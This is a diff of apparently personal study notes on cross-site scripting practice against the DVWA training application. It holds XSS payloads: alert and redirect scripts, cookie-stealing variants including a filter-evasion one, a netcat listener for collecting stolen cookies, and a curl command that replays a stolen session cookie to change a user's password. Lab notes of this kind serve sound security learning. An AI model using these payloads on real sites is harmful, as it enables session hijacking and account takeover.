@@ -7,7 +7,7 @@
     <script>alert('Hello XSS')</script>
   * redirecting 
            
-    <script>document.location = "http://google.com"</script>
+          <script>document.location = "http://google.com"</script>
     
   * Iframe injection (load arbitrary code in the browser)
   
@@ -39,9 +39,13 @@
         netcat -lvp 1234
   * using the stolen cookie to impesonate user ---> in DVWA changing the password of user
 
-    curl --cookie "/security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75" --location "localhost/dvwa/vulnerabilities/csrf/?password_new=chicken&password_conf=chicken&Change=Change#" | grep "Password"
+        curl --cookie "/security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75" --location "localhost/dvwa/vulnerabilities/csrf/?password_new=chicken&password_conf=chicken&Change=Change#" | grep "Password"
  
 ## XSS(Stored)
-*  website allows users to submit comments on blog posts, which are displayed to other users
-
+*  website allows users to submit comments on blog posts, which are displayed to other users. It executes when user visits that site
+   
+        <script>alert(document.cookie)</script>
+        <IMG src=1 onerror=alert(document.cookie)>
+        <scr<script>ipt>alert(document.cookie)</script>
+    
  
